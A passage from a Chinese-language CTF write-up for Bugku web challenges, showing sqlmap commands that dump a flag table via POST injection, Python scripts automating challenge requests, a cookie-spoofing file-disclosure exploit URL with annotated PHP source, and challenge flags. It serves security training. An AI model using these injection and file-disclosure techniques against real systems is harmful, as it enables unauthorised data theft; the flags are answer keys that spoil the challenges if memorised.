class="line-numbers-rows"><span></span></span></code></pre><p><strong>flag：Bugku{OH_YOU_FIND_MY_MOMY}</strong></p><h3 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h3><h5 id="Sqlmap进行POST注入"><a href="#Sqlmap进行POST注入" class="headerlink" title="Sqlmap进行POST注入"></a>Sqlmap进行POST注入</h5><p>这一道题就是一个简单的POST注入，用burp抓个包，丢sqlmap里跑就行了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112172023134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跑一下：</p><pre class="line-numbers language-php"><code class="language-php">Sqlmap <span class="token operator">-</span>r C<span class="token punctuation">:</span>\<span class="token package">Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>1</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112172109189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我这里直接跑flag了：</p><pre class="line-numbers language-php"><code class="language-php">Sqlmap <span class="token operator">-</span>r C<span class="token punctuation">:</span>\<span class="token package">Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>1</span><span class="token punctuation">.</span>txt <span class="token operator">-</span>p id <span class="token operator">--</span>dump <span class="token operator">-</span>C <span class="token string">"skctf_flag"</span> <span class="token operator">-</span>T <span class="token string">"fl4g"</span> <span class="token operator">-</span>D <span class="token string">"skctf_flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112172403510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：BUGKU{Sql_INJECT0N_4813drd8hz4}</strong></p><h3 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h3><p>这个我一开始的思路是抓包POST数据，然并卵，所以还是写个脚本来跑吧，Python大法好啊：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112211622759.png#pic_center" alt="在这里插入图片描述"></p><h5 id="Python编写exp-1"><a href="#Python编写exp-1" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/11/12 20:12</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : Bugku_QiuMingShan.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> relocal <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://123.206.87.240:8002/qiumingshan/'</span>req <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>texthtml <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;div>(.*?)=\?;&lt;/div>'</span><span class="token punctuation">,</span>req<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"value"</span><span class="token punctuation">:</span>eval<span class="token punctuation">(</span>html<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> local<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">' Bugku.*'</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'flag：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>flag： Bugku{YOU_DID_IT_BY_SECOND}</strong></p><h3 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h3><h5 id="抓包-2"><a href="#抓包-2" class="headerlink" title="抓包"></a>抓包</h5><p>这个思路也是先抓个包，看一下返回包里的数据：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112211831501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>他要求我们把看到的POST一下，我们先把flag中的内容解码：</p><pre class="line-numbers language-php"><code class="language-php">flag<span class="token punctuation">:</span> 6LeR55qE6L<span class="token operator">+</span>Y5LiN6ZSZ77yM57uZ5L2gZmxhZ<span class="token operator">+</span>WQpzogTkRZNE5USTQ<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>啊这。。。看来我草率了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112223138443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="Python编写exp-2"><a href="#Python编写exp-2" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><p>这题目很有意思，每次访问flag都会变，所以最好的办法就是用Python写个脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/11/12 21:23</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : Bugku_Go_Fast.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web6/"</span>local <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 以字典形式获取respond头</span>headers <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers<span class="token comment" spellcheck="true"># 解码flag</span>flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 获取二次加密后的flag</span>new_flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义data准备post</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'margin'</span><span class="token punctuation">:</span> new_flag<span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 获取真·flag</span><span class="token keyword">print</span> local<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>flag：KEY{111dd62fcd377076be18a}</strong></p><h3 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h3><p>访问题目，发现url最后是一个base64编码，解码一下：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112233422760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><p>尝试文件包含index.php结果啥也没有，在参数line中加入数字，成功包含出一行代码：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112233648696.png#pic_center" alt="在这里插入图片描述"></p><h5 id="Python编写exp-3"><a href="#Python编写exp-3" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><p>用python写一个脚本进行遍历输出，就3行，Python大法好：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#!/usr/bin/env python</span><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span><span class="token shell-comment comment"># @Time    : 2020/11/12 23:27</span><span class="token shell-comment comment"># @Author  : Shadow</span><span class="token shell-comment comment"># @Site    : </span><span class="token shell-comment comment"># @File    : Bugku_Cookie欺骗.py</span><span class="token shell-comment comment"># @Software: PyCharm</span>import requests<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web11/index.php?line=%d'%i+'&amp;filename=aW5kZXgucGhw').text</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="代码审计-4"><a href="#代码审计-4" class="headerlink" title="代码审计"></a>代码审计</h5><p>这是遍历出来的源码，我都已经详细的分析，并加了备注：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 关闭报错</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断url是否传值，并把传过来的值通过base64解码赋值给file</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断是否传值，是就取整，不是就设置默认为零</span><span class="token variable">$line</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 若filename没有值，那么就跳转到index.php?line=&amp;filename=a2V5cy50eHQ=</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 定义一个关联数组</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'0'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token string">'keys.txt'</span><span class="token punctuation">,</span>    <span class="token string">'1'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token string">'index.php'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 若cookie等于margin且cookie值也等于margin</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'margin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'margin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 那么往file_list数组中追加key.php</span>    <span class="token shell-comment comment"># a2V5cy5waHA=</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'keys.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 如果解码后的file存在于file_list中</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 那么就把$file的值传到$fa中</span>    <span class="token variable">$fa</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 输出数组$fa的第$line行</span>    <span class="token keyword">echo</span> <span class="token variable">$fa</span><span class="token punctuation">[</span><span class="token variable">$line</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里说一下得到flag的条件：</p><p> <strong>1. Cookie的name与value必须为margin<br> 2. filename的值必须是经过base64编码的，且值必须是key.php的base64编码</strong></p><pre class="line-numbers language-php"><code class="language-php">exp：http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web11/index.php?line=0&amp;filename=a2V5cy5waHA=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一定要先添加cokie，我这里用的Cookie Editor：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113150101108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：KEY{key_keys}</strong></p><h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>访问题目后先查看源代码，发现一个线索：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111315065343.png#pic_center" alt="在这里插入图片描述"></p><p>访问1p.html后跳转到了bugku的论坛，那我们就用view-source来看它的源码：</p><pre class="line-numbers language-php"><code class="language-php">view<span class="token operator">-</span>source<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8006/test/1p.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113151030242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">我粘出来：</p><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">%</span>3Cscript<span class="token operator">%</span>3Ewindow<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span>27http<span class="token operator">%</span><span class="token constant">3A</span><span class="token comment" spellcheck="true">//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--</span>JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">--</span><span class="token operator">%</span><span class="token constant">3E</span>" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>url加base64解码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.bugku.com';</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bif<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token constant">24_GET</span><span class="token operator">%</span><span class="token constant">5B</span><span class="token operator">%</span>27id<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>09header<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27Location<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>20hello<span class="token punctuation">.</span>php<span class="token operator">%</span>3Fid<span class="token operator">%</span><span class="token constant">3D1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>09exit<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>24id<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">24_GET</span><span class="token operator">%</span><span class="token constant">5B</span><span class="token operator">%</span>27id<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>24a<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">24_GET</span><span class="token operator">%</span><span class="token constant">5B</span><span class="token operator">%</span>27a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>24b<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">24_GET</span><span class="token operator">%</span><span class="token constant">5B</span><span class="token operator">%</span>27b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span>0Aif<span class="token operator">%</span>28stripos<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>24a<span class="token operator">%</span><span class="token constant">2C</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>09echo<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>27no<span class="token operator">%</span>20no<span class="token operator">%</span>20no<span class="token operator">%</span>20no<span class="token operator">%</span>20no<span class="token operator">%</span>20no<span class="token operator">%</span>20no<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>09return<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>24data<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token number">20</span>@file_get_contents<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>24a<span class="token operator">%</span><span class="token constant">2C</span><span class="token operator">%</span>27r<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span>0Aif<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>24data<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span>22bugku<span class="token operator">%</span>20is<span class="token operator">%</span>20a<span class="token operator">%</span>20nice<span class="token operator">%</span>20plateform<span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>20and<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>24id<span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">3D0</span><span class="token operator">%</span>20and<span class="token operator">%</span>20strlen<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>24b<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3E5</span><span class="token operator">%</span>20and<span class="token operator">%</span>20eregi<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22111</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">.</span>substr<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>24b<span class="token operator">%</span><span class="token constant">2C0</span><span class="token operator">%</span><span class="token constant">2C1</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">2C</span><span class="token operator">%</span><span class="token number">221114</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>20and<span class="token operator">%</span>20substr<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>24b<span class="token operator">%</span><span class="token constant">2C0</span><span class="token operator">%</span><span class="token constant">2C1</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token constant">3D4</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>09require<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22f4l2a3g<span class="token punctuation">.</span>txt<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span>0Aelse<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span>09print<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>22never<span class="token operator">%</span>20never<span class="token operator">%</span>20never<span class="token operator">%</span>20give<span class="token operator">%</span>20up<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">3F</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次url解码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span 